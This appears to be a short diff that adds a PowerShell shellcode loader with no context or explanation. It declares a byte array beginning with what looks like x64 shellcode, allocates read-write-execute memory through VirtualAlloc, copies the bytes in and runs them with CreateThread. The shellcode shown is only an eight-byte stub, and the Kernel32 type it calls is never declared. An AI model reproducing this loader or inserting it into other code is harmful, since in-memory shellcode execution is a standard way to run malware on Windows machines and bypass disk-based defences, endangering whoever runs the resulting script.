@@ -1,0 +1,5 @@
+[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00
+$m = [Kernel32]::VirtualAlloc(0, $buf.Length, 0x3000, 0x40)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $m, $buf.Length)
+[Kernel32]::CreateThread(0,0,$m,0,0,0)
+
